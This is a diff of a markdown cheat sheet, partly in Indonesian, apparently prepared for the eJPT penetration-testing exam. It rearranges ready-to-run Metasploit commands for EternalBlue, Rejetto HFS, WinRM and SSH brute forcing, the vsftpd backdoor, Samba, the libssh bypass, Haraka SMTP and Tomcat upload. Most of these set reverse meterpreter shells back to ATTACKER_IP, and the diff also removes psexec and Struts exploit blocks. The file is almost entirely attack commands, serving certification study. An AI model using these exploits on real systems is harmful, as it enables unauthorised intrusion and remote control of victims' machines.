@@ -558,13 +558,16 @@ check
 
 ### Exploiting A Vulnerable HTTP File Server
 
-```bash
-
-```
-
-### Exploit Umum di eJPT
+### Exploit Windows
 
 ```bash
+# ─── HTTP File Server Rejetto ──────────
+
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS TARGET_IP
+set LHOST ATTACKER_IP
+run
+
 # ─── MS17-010 ETERNALBLUE (Windows 7/Server 2008) ──────────
 
 use exploit/windows/smb/ms17_010_eternalblue
@@ -573,44 +576,24 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST ATTACKER_IP
 run
 
-# ─── MS08-067 (Windows XP/Server 2003) ─────────────────────
+# ─── WinRM ─────────────────────
 
-use exploit/windows/smb/ms08_067_netapi
+use auxiliary/scanner/winrm/winrm_login
 set RHOSTS TARGET_IP
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 run
 
-# ─── VSFTPD 2.3.4 BACKDOOR ─────────────────────────────────
-
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS TARGET_IP
-run
-
-# ─── UNREAL IRCD BACKDOOR ──────────────────────────────────
-
-use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS TARGET_IP
-run
-
-# ─── SAMBA (usermap_script) ────────────────────────────────
-
-use exploit/multi/samba/usermap_script
-set RHOSTS TARGET_IP
-set PAYLOAD cmd/unix/reverse
-set LHOST ATTACKER_IP
-run
-
-# ─── APACHE STRUTS (CVE-2017-5638) ─────────────────────────
-
-use exploit/multi/http/struts2_content_type_ognl
-set RHOSTS TARGET_IP
-set RPORT 8080
-set PAYLOAD linux/x64/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
+use exploit/windows/winrm/winrm_script_exec
+set USERNAME [Username_Valid]
+set PASSWORD [Password_Valid]
 run
 
 # ─── TOMCAT (default credentials) ──────────────────────────
+
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS TARGET_IP
+run
 
 use exploit/multi/http/tomcat_mgr_upload
 set RHOSTS TARGET_IP
@@ -619,23 +602,41 @@ set HttpUsername tomcat
 set HttpPassword tomcat
 set LHOST ATTACKER_IP
 run
+```
 
-# ─── BRUTE FORCE SSH ────────────────────────────────────────
+### Exploit Linux
 
-use auxiliary/scanner/ssh/ssh_login
+```bash
+
+# ─── VSFTPD 2.3.4 BACKDOOR ─────────────────────────────────
+
+use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS TARGET_IP
-set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-set VERBOSE false
 run
 
-# ─── PSEXEC (dengan credentials) ────────────────────────────
+# ─── SAMBA ────────────────────────────────
 
-use exploit/windows/smb/psexec
+use exploit/linux/samba/is_known_pipename
 set RHOSTS TARGET_IP
-set SMBUser administrator
-set SMBPass password123
-set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+Upgare to meterpreter:
+use post/multi/manage/shell_to_meterpreter
+
+# ─── SSH ────────────────────────────────────────
+
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set RHOSTS TARGET_IP
+set SPAWN_PTY true
+run
+
+# ─── SMTP Server ─────────────────────────
+
+use exploit/linux/smtp/haraka
+set rhost TARGET_IP
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set PAYLOAD linux/x64/meterpreter_reverse_tcp
 set LHOST ATTACKER_IP
 run
 ```
